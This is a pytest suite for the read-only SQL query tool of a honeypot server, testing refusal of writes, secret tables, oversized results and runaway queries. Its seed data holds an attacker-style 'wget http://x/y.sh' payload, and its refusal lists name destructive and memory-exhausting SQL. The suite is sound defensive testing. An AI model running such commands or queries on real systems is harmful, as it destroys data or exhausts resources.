"""`sql_query`: read-only, secret-free, bounded."""

from __future__ import annotations

import os
from datetime import UTC, datetime

import pytest

os.environ["DATABASE_URL"] = os.environ.get("TEST_DATABASE_URL", "sqlite+aiosqlite:///:memory:")


@pytest.fixture(autouse=True)
async def setup_db():
    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, init_db

    event_buffer.reset_for_tests()
    await init_db()
    yield
    event_buffer.reset_for_tests()
    await close_db()


async def _seed(n: int = 5) -> None:
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert, AlertSeverity

    async with get_session() as session:
        for i in range(n):
            session.add(
                Alert(
                    source_ip=f"91.121.7.{i + 1}",
                    event_type="telnet_command_input" if i % 2 else "ssh_login_failed",
                    severity=AlertSeverity.MEDIUM,
                    timestamp=datetime.now(UTC),
                    payload={"input": "wget http://x/y.sh; delete me"},
                )
            )


async def test_a_select_returns_columns_and_rows():
    from honeypot_mcp.tools.sql import sql_query

    await _seed(5)
    out = await sql_query(
        "SELECT event_type, count(*) AS n FROM alerts GROUP BY event_type ORDER BY n DESC"
    )

    assert out["columns"] == ["event_type", "n"]
    assert dict(map(tuple, out["rows"])) == {"ssh_login_failed": 3, "telnet_command_input": 2}
    assert out["truncated"] is False


async def test_json_payload_fields_and_ctes_work():
    from honeypot_mcp.tools.sql import sql_query

    await _seed(3)
    out = await sql_query(
        "WITH w AS (SELECT source_ip, payload ->> 'input' AS cmd FROM alerts) "
        "SELECT source_ip FROM w WHERE cmd LIKE '%wget%' ORDER BY source_ip"
    )

    assert [r[0] for r in out["rows"]] == ["91.121.7.1", "91.121.7.2", "91.121.7.3"]


@pytest.mark.parametrize(
    "query",
    [
        "DELETE FROM alerts",
        "UPDATE alerts SET acknowledged = 1",
        "INSERT INTO alerts (source_ip) VALUES ('1.1.1.1')",
        "DROP TABLE alerts",
        "SELECT 1; DELETE FROM alerts",
        "PRAGMA table_info(alerts)",
        "ATTACH DATABASE '/tmp/x.db' AS x",
        "WITH d AS (SELECT 1) DELETE FROM alerts",
        "SELECT * INTO copy FROM alerts",
        "CREATE TABLE t (a int)",
        "VACUUM",
        "SELECT load_extension('x')",
        "",
        "   ",
    ],
)
async def test_anything_that_writes_or_is_not_one_select_is_refused(query):
    from honeypot_mcp.tools.sql import sql_query

    await _seed(2)
    out = await sql_query(query)

    assert "error" in out, query
    from honeypot_mcp.tools.alerts import alerts_stats

    assert (await alerts_stats())["total_alerts"] == 2, "nothing may have changed"


@pytest.mark.parametrize(
    "query",
    [
        "SELECT * FROM honeytokens",
        "SELECT token_value FROM Honeytokens",
        "SELECT * FROM api_keys",
        "SELECT * FROM subscriptions",
        "SELECT * FROM audit_log",
        "SELECT name FROM sqlite_master",
        "SELECT * FROM alerts a JOIN honeytokens h ON 1=1",
    ],
)
async def test_tables_that_hold_secrets_are_refused_even_for_a_viewer(query):
    from honeypot_mcp.tools.sql import sql_query

    out = await sql_query(query)

    assert "error" in out and "secrets" in out["error"], (query, out)


async def test_a_keyword_inside_a_string_or_comment_is_not_a_write():
    """Searching payloads for the word 'delete' is ordinary analysis, and must not be blocked."""
    from honeypot_mcp.tools.sql import sql_query

    await _seed(2)
    out = await sql_query(
        "SELECT count(*) FROM alerts WHERE payload ->> 'input' LIKE '%delete%' -- DROP TABLE x"
    )

    assert out["rows"] == [[2]]


async def test_results_are_capped_and_say_so():
    from honeypot_mcp.tools.sql import sql_query

    await _seed(8)
    out = await sql_query("SELECT id FROM alerts ORDER BY id", limit=3)

    assert out["row_count"] == 3 and out["truncated"] is True and "cut at 3" in out["note"]
    huge = await sql_query("SELECT id FROM alerts", limit=10**6)
    assert huge["row_count"] == 8 and huge["truncated"] is False


async def test_a_bad_query_is_an_error_message_not_a_crash():
    from honeypot_mcp.tools.sql import sql_query

    out = await sql_query("SELECT no_such_column FROM alerts")

    assert "error" in out


async def test_read_only_mode_is_reset_so_normal_writes_still_work():
    """SQLite's query_only is a connection setting; leaving it on would break the next write on a
    pooled connection."""
    from honeypot_mcp.tools.alerts import alerts_stats
    from honeypot_mcp.tools.sql import sql_query

    await sql_query("SELECT 1")
    await _seed(1)

    assert (await alerts_stats())["total_alerts"] == 1


async def test_a_write_cannot_get_through_even_if_the_text_check_is_bypassed(monkeypatch):
    """Layers: the text check, the subquery wrapper (a write is a syntax error inside one) and the
    read-only transaction. Remove the first and the others still hold, which is the point."""
    from honeypot_mcp.tools import sql
    from honeypot_mcp.tools.alerts import alerts_stats

    await _seed(3)
    monkeypatch.setattr(sql, "_check", lambda _q: None)

    for attack in ("DELETE FROM alerts", "UPDATE alerts SET acknowledged = 1", "DROP TABLE alerts"):
        assert "error" in await sql.sql_query(attack), attack
    assert (await alerts_stats())["total_alerts"] == 3


async def test_a_runaway_query_is_stopped_inside_sqlite_and_leaves_a_working_session(monkeypatch):
    """`asyncio.wait_for` cannot stop a SQLite scan: it runs in a worker thread. On the live VPS a
    3-minute window over 11M rows ran 87 s against a 15 s limit and then returned PendingRollbackError.
    The deadline is now enforced by a progress handler inside SQLite."""
    import time

    from honeypot_mcp.config import get_settings
    from honeypot_mcp.tools import sql

    monkeypatch.setattr(get_settings(), "sql_query_timeout_seconds", 1)
    forever = (
        "WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x + 1 FROM c WHERE x < 5000000000) "
        "SELECT count(*) FROM c"
    )

    started = time.monotonic()
    out = await sql.sql_query(forever)
    elapsed = time.monotonic() - started

    assert "did not finish" in out["error"], out
    assert "sql_query_timeout_seconds" in out["error"], "the message must name the setting"
    assert "attack_patterns" in out["error"] and "alert_rollups" in out["error"], out
    assert 0.9 < elapsed < 6, f"a 1 s limit took {elapsed:.1f}s"
    assert (await sql.sql_query("SELECT 1 AS ok"))["rows"] == [[1]], "the next query must just work"
    await _seed(2)
    assert (await sql.sql_query("SELECT count(*) FROM alerts"))["rows"] == [[2]]


def test_the_timeout_setting_defaults_to_15_and_is_validated_to_1_300():
    """The limit became a setting: the default must stay 15 s, and a value outside 1-300 must be
    refused at load (0 would mean 'no limit' to a careless reader, 10 000 would hold a worker)."""
    from pydantic import ValidationError

    from honeypot_mcp.config import Settings

    assert Settings().sql_query_timeout_seconds == 15
    assert Settings(sql_query_timeout_seconds=300).sql_query_timeout_seconds == 300
    for bad in (0, -1, 301, 100_000):
        with pytest.raises(ValidationError):
            Settings(sql_query_timeout_seconds=bad)


# --- resource bounds -------------------------------------------------------------------------------

_SQLITE_ONLY = pytest.mark.skipif(
    not os.environ["DATABASE_URL"].startswith("sqlite"),
    reason="SQLite functions (zeroblob, hex, printf) and its length limit",
)


@_SQLITE_ONLY
async def test_a_value_built_from_a_tiny_query_is_refused_before_it_is_allocated():
    """`hex(zeroblob(N))` is ONE opcode, so the progress handler cannot stop it: three rows of
    50 MB blobs grew the process by ~520 MB, and `zeroblob(499999999)` x the default 200 rows is
    ~200 GB. SQLite's length limit makes the opcode itself fail. 30 MB here keeps the failure mode of
    the old code survivable (about 180 MB) while still being far past the limit."""
    from honeypot_mcp.tools.sql import sql_query

    await _seed(3)
    out = await sql_query("SELECT hex(zeroblob(30000000)) AS big FROM alerts")

    assert "error" in out and "larger than" in out["error"], out
    for builder in (
        "SELECT randomblob(30000000) FROM alerts",
        "SELECT replace(hex(zeroblob(2000000)), '0', 'abcd') FROM alerts",
    ):
        assert "error" in await sql_query(builder), builder
    # printf() answers NULL rather than raising when it would exceed the limit: still no allocation.
    padded = await sql_query("SELECT printf('%.*c', 30000000, 'x') FROM alerts")
    assert all(r == [None] for r in padded["rows"]), padded


@_SQLITE_ONLY
async def test_the_length_limit_is_restored_for_the_next_user_of_the_pooled_connection():
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.tools.sql import sql_query

    await sql_query("SELECT 1")
    async with get_session() as session:
        from sqlalchemy import text

        size = (await session.execute(text("SELECT length(hex(zeroblob(3000000)))"))).scalar_one()

    assert size == 6_000_000, "the 4 MiB cap must not outlive the query that set it"


@_SQLITE_ONLY
async def test_a_large_value_under_the_cap_is_returned_clipped_not_refused():
    from honeypot_mcp.tools.sql import _MAX_CELL_CHARS, sql_query

    await _seed(3)
    out = await sql_query("SELECT hex(zeroblob(1000000)) AS v FROM alerts")

    assert out["row_count"] == 3
    assert all(
        len(r[0]) == _MAX_CELL_CHARS + len(f"... [{2_000_000:,} chars]") for r in out["rows"]
    )


async def test_a_blob_cell_is_clipped_before_it_is_hexed():
    from honeypot_mcp.tools.sql import _MAX_CELL_CHARS, _cell

    assert len(_cell(b"\xab" * 3_000_000)) == _MAX_CELL_CHARS


async def test_a_wide_result_is_cut_at_a_total_size_and_says_so(monkeypatch):
    """Rows x columns x 2,000 characters is unbounded by `limit` alone, and the result lands in a
    model's context."""
    from honeypot_mcp.tools import sql

    await _seed(50)
    monkeypatch.setattr(sql, "_MAX_RESULT_CHARS", 300)
    out = await sql.sql_query("SELECT id, event_type, source_ip FROM alerts ORDER BY id")

    assert out["truncated"] is True and "characters" in out["note"], out
    assert 0 < out["row_count"] < 50
    assert out["row_count"] == len(out["rows"])


async def test_the_first_row_is_always_returned_even_if_it_alone_exceeds_the_budget(monkeypatch):
    from honeypot_mcp.tools import sql

    await _seed(2)
    monkeypatch.setattr(sql, "_MAX_RESULT_CHARS", 3)
    out = await sql.sql_query("SELECT event_type FROM alerts")

    assert out["row_count"] == 1 and out["truncated"] is True


async def test_rows_are_streamed_in_small_batches_not_fetched_whole(monkeypatch):
    """A buffered execute materialises every row, uncut, before any clipping: the batch size is the
    most uncut rows ever held."""
    from honeypot_mcp.tools import sql

    await _seed(25)
    monkeypatch.setattr(sql, "_FETCH_BATCH", 4)
    out = await sql.sql_query("SELECT id FROM alerts ORDER BY id", limit=1000)

    assert out["row_count"] == 25 and out["truncated"] is False


@pytest.mark.parametrize(
    "query",
    [
        "SELECT repeat('x', 500000000)",
        "SELECT lpad('x', 500000000, 'y')",
        "SELECT RPAD('x', 500000000)",
        "SELECT array_fill(0, ARRAY[500000000])",
    ],
)
async def test_padding_functions_are_refused_by_name(query):
    from honeypot_mcp.tools.sql import sql_query

    out = await sql_query(query)

    assert "error" in out and "any size" in out["error"], out


async def test_a_padding_word_inside_a_string_is_not_refused():
    from honeypot_mcp.tools.sql import sql_query

    await _seed(1)
    out = await sql_query("SELECT count(*) FROM alerts WHERE payload ->> 'input' LIKE '%repeat(%'")

    assert out["rows"] == [[0]]
